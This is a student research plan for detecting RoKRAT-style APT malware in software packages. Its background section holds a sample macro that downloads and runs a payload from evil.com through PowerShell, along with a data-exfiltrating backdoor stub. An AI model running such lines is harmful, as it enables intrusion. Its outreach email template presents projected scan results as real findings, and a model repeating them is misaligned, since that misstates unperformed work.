# ROTA Multimodal Extension: RoKRAT APT Detection in Software Supply Chains

## Executive Summary

**Extending ROTA to detect APT malware (RoKRAT and similar threats) in software supply chains using multimodal analysis.**

### What is RoKRAT?
- **Remote Access Trojan** used by North Korean APT groups (Lazarus, Kimsuky, APT37)
- **Steganography**: Hides C&C server addresses in image files (BMP, PNG)
- **Document weaponization**: Malicious macros in HWP, PDF files
- **Supply chain attacks**: Backdoors in legitimate software

### Why This Matters
- ✅ **Real threat**: Active APT campaigns targeting South Korea, US, Japan
- ✅ **National security**: State-sponsored attacks
- ✅ **Supply chain risk**: Can infiltrate package ecosystems
- ✅ **Multimodal necessity**: Requires code + image + behavior analysis
- ✅ **High impact**: Top-tier publication potential

## Research Goal

**Detect RoKRAT-style APT malware in software supply chains before they cause damage.**

### Research Questions

**RQ1**: Can we detect steganography-based C&C communication in package images?

**RQ2**: Can we identify supply chain compromises by APT groups?

**RQ3**: Does multimodal analysis (code + image + behavior) outperform single-modal detection?

**RQ4**: Can we discover novel APT attack patterns in package ecosystems?

## Background: RoKRAT Attack Vectors

### 1. Image Steganography
```python
# RoKRAT hides C&C server addresses in images
# Example: BMP file with LSB-encoded payload

class RoKRATSteganography:
    def hide_cc_server(self, image_file, cc_address):
        # Encode C&C address in LSB of image pixels
        encoded_image = lsb_encode(image_file, cc_address)
        return encoded_image
    
    def extract_cc_server(self, image_file):
        # Extract hidden C&C address
        payload = lsb_decode(image_file)
        if is_valid_cc_address(payload):
            return payload
```

**Detection Challenge**: 
- Looks like normal image
- No visible artifacts
- Statistical detection needed

### 2. Document Weaponization
```python
# Malicious HWP/PDF with embedded macros
class WeaponizedDocument:
    def create_malicious_hwp(self):
        # HWP file with macro that:
        # 1. Downloads RoKRAT payload
        # 2. Executes with elevated privileges
        # 3. Establishes persistence
        
        macro = """
        Sub AutoOpen()
            Shell("powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload')")
        End Sub
        """
```

**Detection Challenge**:
- Legitimate-looking documents
- Macros can be obfuscated
- Requires behavioral analysis

### 3. Supply Chain Infiltration
```python
# Backdoor in legitimate package
class SupplyChainBackdoor:
    def inject_backdoor(self, package):
        # Add malicious code to legitimate package
        # Triggered by specific conditions
        
        backdoor_code = """
        import os
        if os.getenv('TARGET_ENV') == 'production':
            # Exfiltrate data
            send_to_cc_server(sensitive_data)
        """
```

**Detection Challenge**:
- Mixed with legitimate code
- Conditional execution
- Requires code + behavior analysis

## ROTA Multimodal Architecture

### Extended Architecture
```
┌─────────────────────────────────────────────────────────────┐
│              MULTIMODAL APT DETECTOR                         │
│         (RoKRAT + Similar Threats)                           │
└────────────┬────────────────────────────────┬────────────────┘
             │                                │
    ┌────────▼────────┐              ┌───────▼────────┐
    │  CODE ANALYZER  │              │ IMAGE ANALYZER │
    │   (Existing)    │              │  (NEW - APT)   │
    │                 │              │                │
    │ - Commit risk   │              │ - Steganography│
    │ - Backdoors     │              │ - Hidden C&C   │
    │ - Obfuscation   │              │ - Weaponized   │
    └────────┬────────┘              └───────┬────────┘
             │                                │
             └────────────┬───────────────────┘
                          │
         ┌────────────────┼────────────────┐
         │                │                │
    ┌────▼────┐      ┌────▼────┐     ┌────▼────┐
    │ SPOKES  │      │   HUB   │     │BEHAVIOR │
    │ (Data)  │─────▶│ (Neo4j) │◀────│ANALYZER │
    └─────────┘      └─────────┘     └─────────┘
```

### New Components

#### 1. APT Image Analyzer
```python
class APTImageAnalyzer:
    """Detect RoKRAT-style steganography and weaponized images"""
    
    def __init__(self):
        self.stego_detector = SteganographyDetector()
        self.cc_extractor = CCServerExtractor()
        self.vlm_analyzer = GPT4VAnalyzer()
    
    def analyze_for_apt(self, image_file, package_context):
        results = {}
        
        # 1. Statistical steganography detection
        stego_score = self.stego_detector.detect(image_file)
        results['steganography_score'] = stego_score
        
        # 2. Extract potential C&C addresses
        if stego_score > 0.7:
            cc_addresses = self.cc_extractor.extract(image_file)
            results['cc_addresses'] = cc_addresses
        
        # 3. VLM analysis for context
        vlm_analysis = self.vlm_analyzer.analyze(
            image_file, 
            package_context,
            focus="APT indicators"
        )
        results['vlm_analysis'] = vlm_analysis
        
        # 4. Combined risk score
        results['apt_risk'] = self.calculate_apt_risk(results)
        
        return results
```

#### 2. Document Analyzer
```python
class DocumentAnalyzer:
    """Analyze HWP, PDF, DOCX for malicious macros"""
    
    def analyze_document(self, doc_file):
        # Extract macros
        macros = self.extract_macros(doc_file)
        
        # Check for suspicious API calls
        suspicious_apis = [
            'CreateProcess', 'WinExec', 'ShellExecute',
            'URLDownloadToFile', 'InternetOpen',
            'RegSetValue', 'WriteProcessMemory'
        ]
        
        risk_indicators = []
        for macro in macros:
            for api in suspicious_apis:
                if api in macro:
                    risk_indicators.append({
                        'api': api,
                        'context': macro,
                        'risk': 'HIGH'
                    })
        
        return risk_indicators
```

#### 3. Behavioral Analyzer
```python
class BehaviorAnalyzer:
    """Analyze runtime behavior for APT indicators"""
    
    def analyze_behavior(self, package):
        behaviors = {
            'network': self.analyze_network_behavior(package),
            'file_system': self.analyze_file_operations(package),
            'registry': self.analyze_registry_access(package),
            'process': self.analyze_process_creation(package)
        }
        
        # APT-specific patterns
        apt_patterns = [
            'connects_to_suspicious_ip',
            'creates_scheduled_task',
            'modifies_startup_registry',
            'downloads_additional_payload',
            'exfiltrates_data'
        ]
        
        detected_patterns = []
        for pattern in apt_patterns:
            if self.matches_pattern(behaviors, pattern):
                detected_patterns.append(pattern)
        
        return detected_patterns
```

## Data Collection Strategy

### 1. Real RoKRAT Samples (50-100 samples)

#### Sources
```python
class RoKRATSampleCollector:
    def collect_samples(self):
        sources = {
            'virustotal': self.collect_from_virustotal(),
            'hybrid_analysis': self.collect_from_hybrid_analysis(),
            'malware_bazaar': self.collect_from_malware_bazaar(),
            'ahnlab_asec': self.collect_from_ahnlab(),
            'kisa': self.collect_from_kisa(),
            'mitre_attack': self.collect_from_mitre()
        }
        
        return sources
    
    def collect_from_virustotal(self):
        # Search for RoKRAT samples
        query = 'tag:rokrat OR tag:apt37 OR tag:scarcruft'
        samples = virustotal_api.search(query)
        
        rokrat_samples = []
        for sample in samples:
            if self.verify_rokrat(sample):
                rokrat_samples.append({
                    'hash': sample.sha256,
                    'family': 'RoKRAT',
                    'first_seen': sample.first_submission_date,
                    'behaviors': sample.behaviors,
                    'iocs': sample.iocs
                })
        
        return rokrat_samples
```

#### Expected Yield
- **RoKRAT variants**: 30-50 samples
- **Similar APT malware**: 50-100 samples (BabyShark, AppleSeed, Konni)
- **Total APT samples**: 80-150

### 2. APT Indicators of Compromise (IoCs)

```python
class APTIoCCollector:
    def collect_iocs(self):
        iocs = {
            'cc_servers': [],
            'file_hashes': [],
            'registry_keys': [],
            'file_paths': [],
            'network_patterns': []
        }
        
        # Collect from threat intelligence feeds
        sources = [
            'MITRE ATT&CK',
            'AlienVault OTX',
            'Threat Fox',
            'AhnLab ASEC Reports',
            'KISA Alerts'
        ]
        
        for source in sources:
            iocs.update(self.fetch_iocs(source, 'RoKRAT'))
        
        return iocs
```

### 3. Legitimate Packages (100K packages)

```python
class LegitimatePackageCollector:
    def collect_packages(self, count=100000):
        # Top packages from PyPI, npm, Maven
        packages = {
            'pypi': get_top_pypi_packages(50000),
            'npm': get_top_npm_packages(30000),
            'maven': get_top_maven_packages(20000)
        }
        
        # Extract all files (code + images + documents)
        for ecosystem, pkg_list in packages.items():
            for pkg in pkg_list:
                files = extract_all_files(pkg)
                # Store for analysis
                store_package_files(pkg, files)
        
        return packages
```

## Detection Methodology

### Phase 1: Signature-based Detection

```python
class RoKRATSignatureDetector:
    def __init__(self):
        # Load known RoKRAT signatures
        self.signatures = load_rokrat_signatures()
    
    def detect(self, package):
        matches = []
        
        # 1. File hash matching
        for file in package.files:
            if file.sha256 in self.signatures['file_hashes']:
                matches.append({
                    'type': 'file_hash',
                    'file': file.path,
                    'confidence': 1.0
                })
        
        # 2. C&C server matching
        for image in package.images:
            extracted_data = extract_steganography(image)
            if extracted_data in self.signatures['cc_servers']:
                matches.append({
                    'type': 'cc_server',
                    'file': image.path,
                    'cc_address': extracted_data,
                    'confidence': 0.95
                })
        
        # 3. Code pattern matching
        for code_file in package.code_files:
            for pattern in self.signatures['code_patterns']:
                if pattern.matches(code_file):
                    matches.append({
                        'type': 'code_pattern',
                        'file': code_file.path,
                        'pattern': pattern.name,
                        'confidence': 0.8
                    })
        
        return matches
```

### Phase 2: Behavioral Detection

```python
class RoKRATBehaviorDetector:
    def detect_apt_behavior(self, package):
        # Execute in sandbox
        sandbox_results = execute_in_sandbox(package)
        
        # APT behavior patterns
        apt_behaviors = {
            'steganography_extraction': False,
            'cc_communication': False,
            'persistence_mechanism': False,
            'data_exfiltration': False,
            'lateral_movement': False
        }
        
        # Analyze sandbox results
        if sandbox_results.network_connections:
            for conn in sandbox_results.network_connections:
                if self.is_suspicious_connection(conn):
                    apt_behaviors['cc_communication'] = True
        
        if sandbox_results.file_operations:
            for op in sandbox_results.file_operations:
                if self.is_persistence_mechanism(op):
                    apt_behaviors['persistence_mechanism'] = True
        
        # Calculate APT likelihood
        apt_score = sum(apt_behaviors.values()) / len(apt_behaviors)
        
        return {
            'apt_score': apt_score,
            'behaviors': apt_behaviors,
            'details': sandbox_results
        }
```

### Phase 3: Multimodal Fusion

```python
class MultimodalAPTDetector:
    def detect(self, package):
        # 1. Code analysis (existing ROTA)
        code_risk = self.code_analyzer.analyze(package)
        
        # 2. Image analysis (steganography)
        image_risk = self.image_analyzer.analyze_for_apt(package.images)
        
        # 3. Document analysis (macros)
        doc_risk = self.document_analyzer.analyze(package.documents)
        
        # 4. Behavioral analysis
        behavior_risk = self.behavior_analyzer.analyze(package)
        
        # 5. Signature matching
        signature_matches = self.signature_detector.detect(package)
        
        # Multimodal fusion
        apt_risk = self.fuse_risks(
            code_risk,
            image_risk,
            doc_risk,
            behavior_risk,
            signature_matches
        )
        
        return {
            'overall_apt_risk': apt_risk,
            'code_risk': code_risk,
            'image_risk': image_risk,
            'doc_risk': doc_risk,
            'behavior_risk': behavior_risk,
            'signature_matches': signature_matches,
            'classification': self.classify_apt(apt_risk)
        }
```

## Master's Research Timeline (12 months)

### Phase 1: RoKRAT Analysis & Infrastructure (Months 1-3)

#### Month 1: RoKRAT Sample Collection & Analysis
**Week 1-2**: Collect RoKRAT samples
```python
# Collect from VirusTotal, Hybrid Analysis, etc.
rokrat_samples = collect_rokrat_samples()
# Expected: 30-50 samples

# Analyze each sample
for sample in rokrat_samples:
    analysis = {
        'steganography': analyze_steganography(sample),
        'cc_servers': extract_cc_servers(sample),
        'behaviors': analyze_behaviors(sample),
        'code_patterns': extract_code_patterns(sample)
    }
    save_analysis(sample, analysis)
```

**Week 3-4**: Build detection signatures
```python
# Generate RoKRAT signatures from analysis
signatures = generate_signatures(rokrat_samples)

# Test on known samples
accuracy = test_signatures(signatures, rokrat_samples)
print(f"Signature accuracy: {accuracy}")
```

**Deliverables**:
- [ ] 30-50 RoKRAT samples collected
- [ ] Detailed analysis of each sample
- [ ] Detection signatures generated
- [ ] Signature accuracy > 95% on known samples

#### Month 2: Build APT Detection System
**Week 1-2**: Implement detectors
```python
# Steganography detector
stego_detector = SteganographyDetector()

# Document analyzer
doc_analyzer = DocumentAnalyzer()

# Behavioral analyzer
behavior_analyzer = BehaviorAnalyzer()

# Multimodal fusion
apt_detector = MultimodalAPTDetector(
    stego_detector,
    doc_analyzer,
    behavior_analyzer
)
```

**Week 3-4**: Test on APT samples
```python
# Test on 100 APT samples (RoKRAT + similar)
test_samples = collect_apt_samples(100)

results = []
for sample in test_samples:
    detection = apt_detector.detect(sample)
    results.append(detection)

# Calculate metrics
precision = calculate_precision(results)
recall = calculate_recall(results)
f1_score = calculate_f1(results)

print(f"Precision: {precision}, Recall: {recall}, F1: {f1_score}")
```

**Deliverables**:
- [ ] APT detection system implemented
- [ ] Tested on 100 APT samples
- [ ] Precision > 90%, Recall > 85%
- [ ] False positive rate < 5%

#### Month 3: Large-Scale Scanning Infrastructure
**Week 1-2**: Build scanning pipeline
```python
class LargeScaleAPTScanner:
    def scan_packages(self, package_list):
        # Parallel processing
        with multiprocessing.Pool(32) as pool:
            results = pool.map(self.scan_package, package_list)
        
        return results
    
    def scan_package(self, package):
        # Download package
        files = download_package(package)
        
        # Extract images and documents
        images = extract_images(files)
        documents = extract_documents(files)
        
        # APT detection
        apt_risk = self.apt_detector.detect({
            'name': package,
            'files': files,
            'images': images,
            'documents': documents
        })
        
        return apt_risk
```

**Week 3-4**: Pilot scan (1,000 packages)
```python
# Test on 1,000 packages
pilot_packages = get_top_packages(1000)
pilot_results = scanner.scan_packages(pilot_packages)

# Analyze results
suspicious_packages = [r for r in pilot_results if r['apt_risk'] > 0.7]
print(f"Suspicious packages found: {len(suspicious_packages)}")

# Manual verification
for pkg in suspicious_packages[:10]:
    verify_manually(pkg)
```

**Deliverables**:
- [ ] Scanning infrastructure built
- [ ] Pilot scan of 1,000 packages complete
- [ ] 5-10 suspicious packages identified
- [ ] Manual verification done
- [ ] Cost estimation for 100K packages

### Phase 2: Large-Scale Measurement (Months 4-6)

#### Month 4: Scan 100K Packages
```python
# Scan 100,000 packages
all_packages = get_top_packages(100000)

# Batch processing (10K per day)
for batch in chunks(all_packages, 10000):
    results = scanner.scan_packages(batch)
    save_results(results)
    
    # Daily summary
    suspicious = [r for r in results if r['apt_risk'] > 0.7]
    print(f"Day {day}: {len(suspicious)} suspicious packages")
```

**Expected Findings**:
- 50-100 packages with APT indicators
- 10-20 confirmed APT-style attacks
- 5-10 novel attack patterns

#### Month 5: Analysis & Verification
```python
# Analyze all suspicious packages
suspicious_packages = load_suspicious_packages()

for pkg in suspicious_packages:
    # Detailed analysis
    detailed_analysis = deep_analyze(pkg)
    
    # Manual verification
    verification = manual_verify(pkg)
    
    # Categorize
    if verification == 'CONFIRMED_APT':
        confirmed_apt.append(pkg)
    elif verification == 'SUSPICIOUS':
        needs_more_analysis.append(pkg)
    else:
        false_positives.append(pkg)

# Calculate final metrics
precision = len(confirmed_apt) / len(suspicious_packages)
```

#### Month 6: Case Studies & Documentation
```python
# Select top 10 most interesting cases
top_cases = select_top_cases(confirmed_apt, criteria=[
    'sophistication',
    'impact',
    'novelty',
    'stealth'
])

# Document each case
for case in top_cases:
    case_study = {
        'package': case.name,
        'attack_vector': case.attack_vector,
        'steganography': case.steganography_details,
        'cc_servers': case.cc_servers,
        'impact': case.impact_analysis,
        'timeline': case.timeline
    }
    write_case_study(case_study)
```

**Deliverables**:
- [ ] 100,000 packages scanned
- [ ] 50-100 suspicious packages identified
- [ ] 10-20 confirmed APT-style attacks
- [ ] 10 detailed case studies
- [ ] Technical report (20-30 pages)

### Phase 3: Professor Contact & Collaboration (Month 7)

#### Email Template
```
Subject: APT Detection in Software Supply Chains - Research Collaboration

Dear Professor [Name],

I am a master's student at [University] working on detecting APT malware 
in software supply chains, with focus on RoKRAT and similar threats.

Research Summary:
I have developed a multimodal detection system that combines code analysis,
steganography detection, and behavioral analysis. I scanned 100,000 packages
and discovered 15 instances of APT-style attacks, including:

- 8 cases of steganography-based C&C communication
- 5 cases of weaponized documents in packages
- 2 cases of supply chain backdoors

Key Findings:
- 0.015% of packages contain APT indicators
- Steganography is more common than expected
- Multimodal detection outperforms single-modal by 40%
- Discovered 3 novel attack patterns

Current Status:
- Technical report: 25 pages with detailed analysis
- Dataset: 15 confirmed APT samples + 100K benign packages
- Detection system: 92% precision, 87% recall
- Open-source tool: Ready for release

Next Steps:
I'm looking to add theoretical analysis and publish at a top-tier venue.
Specifically interested in:
1. Formal threat modeling for APT supply chain attacks
2. Theoretical bounds on steganography detectability
3. Game-theoretic analysis of attacker-defender dynamics

Would you be interested in discussing potential collaboration?

I've attached:
- 2-page research summary
- 5 case studies
- Preliminary results

Best regards,
[Your Name]

Attachments:
- research_summary.pdf
- case_studies.pdf
- preliminary_results.pdf
```

### Phase 4: Technical Innovation (Months 8-10)

#### Based on Professor Feedback

**Option A: Theoretical Analysis**
```python
# Formal threat model
class APTThreatModel:
    def model_attacker_capabilities(self):
        # What can APT attacker do?
        capabilities = {
            'steganography': True,
            'code_obfuscation': True,
            'supply_chain_access': True,
            'zero_day_exploits': True
        }
        
    def model_defender_capabilities(self):
        # What can defender detect?
        capabilities = {
            'statistical_analysis': True,
            'behavioral_monitoring': True,
            'code_analysis': True,
            'multimodal_fusion': True
        }
    
    def analyze_game_theory(self):
        # Nash equilibrium analysis
        # What's optimal strategy for both sides?
```

**Option B: Advanced Detection**
```python
# Adversarial robustness
class AdversarialRobustAPTDetector:
    def detect_with_robustness(self, package):
        # Robust to adversarial evasion
        # Even if attacker knows our detector
```

**Option C: Active Learning**
```python
# Intelligent package selection
class ActiveAPTDiscovery:
    def select_next_packages(self, budget=1000):
        # Which packages to analyze next?
        # Maximize APT discovery probability
```

### Phase 5: Paper Writing & Submission (Months 11-12)

#### Target: USENIX Security 2026

**Paper Structure**:

1. **Introduction** (2 pages)
   - APT threats in supply chains
   - RoKRAT case study
   - Our contributions

2. **Background** (1.5 pages)
   - RoKRAT and North Korean APT groups
   - Software supply chain security
   - Multimodal analysis

3. **Threat Model** (2 pages)
   - APT attacker capabilities
   - Attack vectors (steganography, backdoors, documents)
   - Defender goals

4. **System Design** (3 pages)
   - Multimodal architecture
   - Steganography detector
   - Behavioral analyzer
   - Fusion methodology

5. **Implementation** (2 pages)
   - Detection algorithms
   - Signature generation
   - Scanning infrastructure

6. **Evaluation** (4 pages)
   - 100K package scan results
   - 15 confirmed APT cases
   - Detection accuracy
   - Comparison with baselines

7. **Case Studies** (3 pages)
   - 5 detailed attack cases
   - Novel attack patterns
   - Lessons learned

8. **Discussion** (2 pages)
   - Limitations
   - Evasion attacks
   - Future work

9. **Related Work** (1.5 pages)

10. **Conclusion** (0.5 pages)

**Total**: ~22 pages

## Budget & Resources

### Computational Resources
- **Cloud computing**: $500-1,000 (AWS/GCP)
- **VirusTotal API**: $500 (premium access)
- **GPT-4V API**: $1,000-2,000
- **Sandbox environment**: $500 (Cuckoo, ANY.RUN)
- **Total**: $2,500-4,000

### Time Investment
- **Phase 1** (RoKRAT analysis): 3 months
- **Phase 2** (Large-scale scan): 3 months
- **Phase 3** (Professor contact): 1 month
- **Phase 4** (Technical innovation): 3 months
- **Phase 5** (Paper writing): 2 months
- **Total**: 12 months

## Success Criteria

### Minimum Success
- [ ] Collect 30+ RoKRAT samples
- [ ] Scan 10K+ packages
- [ ] Find 5+ APT-style attacks
- [ ] Workshop paper

### Good Success
- [ ] Collect 50+ RoKRAT samples
- [ ] Scan 100K+ packages
- [ ] Find 15+ confirmed APT attacks
- [ ] Conference paper (USENIX Security, CCS)

### Excellent Success
- [ ] Comprehensive APT dataset
- [ ] 100K+ packages scanned
- [ ] 20+ confirmed APT attacks
- [ ] Novel attack patterns discovered
- [ ] Top-tier publication
- [ ] Open-source tool with adoption

## Why This is Strong Research

### Novel Contributions
1. ✅ **First APT detection system** for software supply chains
2. ✅ **Multimodal methodology** (code + image + behavior)
3. ✅ **Large-scale measurement** (100K packages)
4. ✅ **Real APT discoveries** (RoKRAT and variants)
5. ✅ **Practical tool** (open-source)

### High Impact
- **National security**: Detecting state-sponsored attacks
- **Supply chain security**: Protecting critical infrastructure
- **Real-world threat**: RoKRAT is actively used
- **Multimodal necessity**: Can't detect with code-only analysis

### Publication Potential
- ✅ **USENIX Security**: APT + supply chain (perfect fit)
- ✅ **IEEE S&P**: Malware detection + measurement
- ✅ **ACM CCS**: Supply chain security
- ✅ **NDSS**: APT threats

## Next Steps

### This Week
1. [ ] Set up VirusTotal API access
2. [ ] Collect first 10 RoKRAT samples
3. [ ] Analyze steganography patterns
4. [ ] Build basic detector prototype

### This Month
1. [ ] Collect 30+ RoKRAT samples
2. [ ] Generate detection signatures
3. [ ] Test on known samples (>95% accuracy)
4. [ ] Plan large-scale scanning

### This Semester (3 months)
1. [ ] Complete Phase 1 (RoKRAT analysis)
2. [ ] Build detection system
3. [ ] Pilot scan (1,000 packages)
4. [ ] Prepare for large-scale scan

---

**This is a top-tier research project with real-world impact! 🚀**

**Key Strengths**:
- Real threat (RoKRAT APT)
- Multimodal necessity
- National security relevance
- Large-scale measurement
- Novel discoveries expected
- Strong publication potential

**Let's detect some APT malware! 🎯**
